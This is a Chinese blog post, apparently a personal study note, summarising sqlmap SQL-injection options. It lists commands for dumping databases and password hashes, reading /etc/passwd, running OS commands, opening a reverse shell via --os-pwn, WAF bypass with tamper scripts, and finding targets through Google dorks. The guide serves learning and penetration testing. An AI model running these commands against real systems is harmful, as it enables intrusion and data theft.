@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="LuRen"><meta name="copyright" content="LuRen"><meta name="generator" content="Hexo 6.2.0"><meta name="theme" content="hexo-theme-yun"><title>sqlmap简单用法 | 圥忈的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.3.3/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/@unocss/runtime/mini.global.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><script src="https://fastly.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer type="module"></script><script src="https://fastly.jsdelivr.net/npm/vue@2.6.14"></script><link rel="icon" type="image/svg+xml" href="/ghost-smile-line.svg"><link rel="mask-icon" href="/ghost-smile-line.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"weaving-dreams.github.io","root":"/","title":"圥忈的小站","version":"1.10.2","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":["102, 167, 221","\t255,0,255","33, 78, 194","255,69,0"]},"waline":{"config":{"enable":true,"serverURL":"https://waline-1gafcjzkcbb7fe08-1310495826.ap-shanghai.app.tcloudbase.com/waline","comment":true,"visitor":true,"emoji":["https://unpkg.com/@waline/emojis@1.0.1/bilibili","https://unpkg.com/@waline/emojis@1.0.1/qq","https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"placeholder":"来都来了，不说点什么吗","level0":"炼体","level1":"炼气","level2":"筑基","level3":"金丹","level4":"元婴","level5":"化神"},"el":"#waline","lang":"zh-CN"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="圥忈的小站" type="application/atom+xml"><script src="//at.alicdn.com/t/font_3319107_f11xxoznd2e.js" async></script><meta name="description" content="sqlmap介绍sqlmap是一个开源的渗透测试工具，可以自动检测和利用SQL注入缺陷并接管数据库服务器。它具有强大的检测引擎，许多用于终极渗透测试仪的利基功能，以及广泛的开关，包括数据库指纹识别，从数据库获取数据，访问底层文件系统以及通过带外连接在操作系统上执行命令。   sqlmap官方网站：http:&#x2F;&#x2F;www.sqlmap.org&#x2F;   sqlmap支持五种不同的注入模式：  基于布尔的盲">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap简单用法">
+<meta property="og:url" content="https://weaving-dreams.github.io/posts/15042a92/index.html">
+<meta property="og:site_name" content="圥忈的小站">
+<meta property="og:description" content="sqlmap介绍sqlmap是一个开源的渗透测试工具，可以自动检测和利用SQL注入缺陷并接管数据库服务器。它具有强大的检测引擎，许多用于终极渗透测试仪的利基功能，以及广泛的开关，包括数据库指纹识别，从数据库获取数据，访问底层文件系统以及通过带外连接在操作系统上执行命令。   sqlmap官方网站：http:&#x2F;&#x2F;www.sqlmap.org&#x2F;   sqlmap支持五种不同的注入模式：  基于布尔的盲">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-06-16T14:16:08.000Z">
+<meta property="article:modified_time" content="2022-06-16T14:28:53.706Z">
+<meta property="article:author" content="LuRen">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary"><script>(function() {
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="LuRen"><img width="96" loading="lazy" src="/images/1.jpg" alt="LuRen"><span class="site-author-status" title="努力ing">🤡</span></a><div class="site-author-name"><a href="/about/">LuRen</a></div><a class="site-name" href="/about/site.html">圥忈的小站</a><sub class="site-subtitle">努力ing</sub><div class="site-description">一个自言自语的地方</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">50</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">21</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">18</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/weaving-dreams" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.yuque.com/yuqueyonghuvseqgc/wze6w2" title="语雀" target="_blank" style="color:#007722"><span class="icon iconify" data-icon="ant-design:yuque-outlined"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/u/6603251070" title="微博" target="_blank" style="color:#E6162D"><span class="icon iconify" data-icon="ri:weibo-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=1475793651" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/499227133?share_medium=android&amp;share_plat=android&amp;share_session_id=f72830f6-8f5f-413a-86d2-6043b1bd69eb&amp;share_source=WEIXIN&amp;share_tag=s_i&amp;timestamp=1646642363&amp;unique_k=pDXLBN4" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="http://www.coolapk.com/u/4097869" title="酷安" target="_blank" style="color:#007722"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-kuancoolapk1"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="友联 links" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a><a class="links-item hty-icon-button" href="/albums/" title="相册集" style="color:#6e5494"><span class="icon iconify" data-icon="ri:gallery-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">sqlmap介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMap%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">SQLMap的一些参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.1.1.</span> <span class="toc-text">枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9%E6%9D%83%E9%99%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">测试注入点权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cshell%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.3.</span> <span class="toc-text">执行shell命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Csql%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.4.</span> <span class="toc-text">执行sql命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.5.</span> <span class="toc-text">POST提交方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E8%AF%A6%E7%BB%86%E7%9A%84%E7%AD%89%E7%BA%A7"><span class="toc-number">2.1.6.</span> <span class="toc-text">显示详细的等级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5HTTP%E8%AF%B7%E6%B1%82"><span class="toc-number">2.1.7.</span> <span class="toc-text">注入HTTP请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%AD%89%E7%BA%A7"><span class="toc-number">2.1.8.</span> <span class="toc-text">注入等级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E6%8F%92%E4%BB%B6"><span class="toc-number">2.1.9.</span> <span class="toc-text">使用sqlmap插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.10.</span> <span class="toc-text">其他参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.2.</span> <span class="toc-text">基本步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">2.3.</span> <span class="toc-text">信息获取</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://weaving-dreams.github.io/posts/15042a92/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="LuRen"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="圥忈的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">sqlmap简单用法</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2022-06-16 22:16:08" itemprop="dateCreated datePublished" datetime="2022-06-16T22:16:08+08:00">2022-06-16</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.8k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">8m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/15042a92/" data-flag-title="sqlmap简单用法"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="评论数"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/posts/15042a92/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">学习</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0/%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">工具用法</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%B7%A5%E5%85%B7/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">工具</span></a><a class="tag-item" href="/tags/sqlmap/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">sqlmap</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a>sqlmap介绍</h2><p>sqlmap是一个开源的渗透测试工具，可以自动检测和利用SQL注入缺陷并接管数据库服务器。它具有强大的检测引擎，许多用于终极渗透测试仪的利基功能，以及广泛的开关，包括数据库指纹识别，从数据库获取数据，访问底层文件系统以及通过带外连接在操作系统上执行命令。</p>
+<br>
+
+<p>sqlmap官方网站：<a target="_blank" rel="noopener" href="http://www.sqlmap.org/">http://www.sqlmap.org/</a></p>
+<br>
+
+<p>sqlmap支持五种不同的注入模式：</p>
+<ul>
+<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li>
+<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
+<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
+<li>联合查询注入，可以使用union的情况下的注入；</li>
+<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
+</ul>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="SQLMap的一些参数"><a href="#SQLMap的一些参数" class="headerlink" title="SQLMap的一些参数"></a>SQLMap的一些参数</h3><h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><p>  T这些选项可用于枚举后端数据库管理系统的信息、结构和数据表。此外，还可以运行自己的SQL语句<br>  -a, –all      #检索全部<br>  -b, –banner     #检索 banner<br>  –current-user    #检索当前用户<br>  –current-db     #检索当前数据库<br>  –passwords     #列出用户密码的hash值<br>  –tables       #列出表<br>  –columns      #列出字段<br>  –schema       #列出DBMS schema<br>  –dump        #Dump DBMS数据库表的条目<br>  –dump-all      #Dump 所有DBMS数据库表的条目<br>  -D DB        #指定数据库<br>  -T TBL        #指定表<br>  -C COL        #指定字段</p>
+<h4 id="测试注入点权限"><a href="#测试注入点权限" class="headerlink" title="测试注入点权限"></a>测试注入点权限</h4><p>测试所有用户的权限：sqlmap -u URL – privileges</p>
+<p>测试a用户的权限：sqlmap -u URL – privileges -U a</p>
+<h4 id="执行shell命令"><a href="#执行shell命令" class="headerlink" title="执行shell命令"></a>执行shell命令</h4><p>sqlmap -u URL –os-cmd&#x3D;”net user”</p>
+<p>系统交互的shell：sqlmap -u URL –os-shell</p>
+<h4 id="执行sql命令"><a href="#执行sql命令" class="headerlink" title="执行sql命令"></a>执行sql命令</h4><p>SQL交互的shell，执行sql语句：sqlmap -u URL –sql-shell</p>
+<p>sqlmap -u URL –sql-query&#x3D;”sql”</p>
+<h4 id="POST提交方式"><a href="#POST提交方式" class="headerlink" title="POST提交方式"></a>POST提交方式</h4><p>sqlmap -u URL –data “POST参数”</p>
+<h4 id="显示详细的等级"><a href="#显示详细的等级" class="headerlink" title="显示详细的等级"></a>显示详细的等级</h4><p>sqlmap -u URL –dbs -v 1</p>
+<p>-v 参数包含7个等级。</p>
+<p>0:    只显示Python的回溯、错误和关键消息。</p>
+<p>1：显示信息和警告信息。</p>
+<p>2：显示调试信息。</p>
+<p>3：有效载荷注入。</p>
+<p>4：显示HTTP请求。</p>
+<p>5：显示HTTP响应头。</p>
+<p>6：显示HTTP响应页面的内容。</p>
+<h4 id="注入HTTP请求"><a href="#注入HTTP请求" class="headerlink" title="注入HTTP请求"></a>注入HTTP请求</h4><p>sqlmap -r test.txt –dbs</p>
+<p>test.txt 的内容为HTTP请求。</p>
+<p>–referer  “”  #使用referer欺骗</p>
+<h4 id="注入等级"><a href="#注入等级" class="headerlink" title="注入等级"></a>注入等级</h4><p>sqlmap -u URL –level 3	#sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5</p>
+<h4 id="使用sqlmap插件"><a href="#使用sqlmap插件" class="headerlink" title="使用sqlmap插件"></a>使用sqlmap插件</h4><p>sqlmap -u URL -tamper “插件名称”</p>
+<p>插件一般都保存在sqlmap目录下的tamper文件夹中，通常用来绕过WAF。</p>
+<h4 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h4><pre class="language-none"><code class="language-none">--risk 3           #执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
+--tamper xx.py,cc.py   #防火墙绕过，后接tamper库中的py文件
+ --proxy “目标地址″   #使用代理注入</code></pre>
+
+<p> –risk 3           执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p>
+<p>–threads 10  线程，sqlmap线程最高设置为10</p>
+<p>–dump	参数意为转存数据，-C参数指定字段名称，-T指定表名，-D指定数据库名称。如果有数据库关键字需要加上”[]”,如[User]。<br>读取数据后，数据会存到sqlmap&#x2F;output&#x2F;下</p>
+<h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><p> #获取当前用户名称</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --current-user</code></pre>
+
+<p> #获取当前数据库名称</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --current-db</code></pre>
+
+<p> #列表名</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --tables -D &quot;db_name&quot;</code></pre>
+
+
+
+<p> #列字段</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --columns -T &quot;tablename&quot; users-D &quot;db_name&quot; -v 0</code></pre>
+
+
+
+<p> #获取字段内容</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --dump -C &quot;column_name&quot; -T &quot;table_name&quot; -D&quot;db_name&quot; -v 0</code></pre>
+
+
+
+
+
+
+
+<h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>#smart 智能 level 执行测试等级</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --smart --level 3 --users</code></pre>
+
+<p>#dbms 指定数据库类型</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --dbms &quot;Mysql&quot; --users </code></pre>
+
+
+
+<p> #列数据库用户</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --users</code></pre>
+
+
+
+<p>#列数据库</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --dbs</code></pre>
+
+
+
+<p> #数据库用户密码</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --passwords</code></pre>
+
+
+
+<p>#列出指定用户数据库密码</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --passwords-U root -v 0 </code></pre>
+
+
+
+<p> #列出指定字段，列出 20 条</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --dump -C &quot;password,user,id&quot; -T &quot;tablename&quot; -D &quot;db_name&quot; --start 1 --stop 20</code></pre>
+
+
+
+<p> #列出所有数据库所有表</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --dump-all -v 0</code></pre>
+
+
+
+<p> #查看权限</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --privileges</code></pre>
+
+
+
+<p>#查看指定用户权限</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --privileges -U root </code></pre>
+
+
+
+<p>#是否是数据库管理员</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --is-dba -v 1 </code></pre>
+
+
+
+<p>#枚举数据库用户角色</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --roles </code></pre>
+
+
+
+<p> #导入用户自定义函数（获取系统权限！）</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --udf-inject</code></pre>
+
+
+
+<p> #列出当前库所有表</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --dump-all --exclude-sysdbs -v 0</code></pre>
+
+
+
+<p> #union 查询表记录</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --union-cols</code></pre>
+
+
+
+<p> #cookie 注入</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --cookie &quot;COOKIE_VALUE&quot;</code></pre>
+
+
+
+<p>#获取 banner 信息</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; -b </code></pre>
+
+
+
+<p> #post 注入</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --data &quot;id&#x3D;3&quot;</code></pre>
+
+
+
+<p>#指纹判别数据库类型</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; -v 1 -f </code></pre>
+
+
+
+<p>#代理注入</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --proxy&quot;http:&#x2F;&#x2F;127.0.0.1:8118&quot; </code></pre>
+
+
+
+<p> #指定关键词</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;</code></pre>
+
+
+
+<p>#执行指定 sql 命令</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --sql-shell </code></pre>
+
+
+
+<p>文件位置</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --file &#x2F;etc&#x2F;passwd</code></pre>
+
+
+
+<p> #执行系统命令</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --os-cmd&#x3D;whoami</code></pre>
+
+
+
+<p> #系统交互 shell</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --os-shell</code></pre>
+
+
+
+<p> #反弹 shell</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --os-pwn</code></pre>
+
+
+
+<p> #读取 win 系统注册表</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --reg-read</code></pre>
+
+
+
+<p>#保存进度</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --dbs-o &quot;sqlmap.log&quot; </code></pre>
+
+
+
+<p> #恢复已保存进度</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --dbs -o &quot;sqlmap.log&quot; --resume</code></pre>
+
+
+
+<p>#反弹 shell 需metasploit 路径</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --msf-path&#x3D;&#x2F;opt&#x2F;metasploit3&#x2F;msf2 --os-pwn </code></pre>
+
+
+
+<p>#加载脚本(可利用绕过注入限制)</p>
+<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;XXXXXXX?id&#x3D;1&quot; --tamper &quot;base64encode.py&quot; </code></pre>
+
+
+
+<p> #google 搜索注入点自动 跑出所有字段</p>
+<pre class="language-none"><code class="language-none">sqlmap -g &quot;google 语法&quot; --dump-all --batch</code></pre>
+
+
+
+<br>
+
+
+
+<hr>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/whitehawk-p-9880179.html">sqlmap的简单使用 - 走看看 (zoukankan.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cscshi/p/15705030.html#11-sqlmap%E7%AE%80%E4%BB%8B">超详细SQLMap使用攻略及技巧分享 - 锦瑟，无端 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.pianshen.com/article/6093727338/">sqlmap 简单使用 - 程序员大本营 (pianshen.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/MyJxXaLXJn/">sqlmap用法 (bbsmax.com)</a></p>
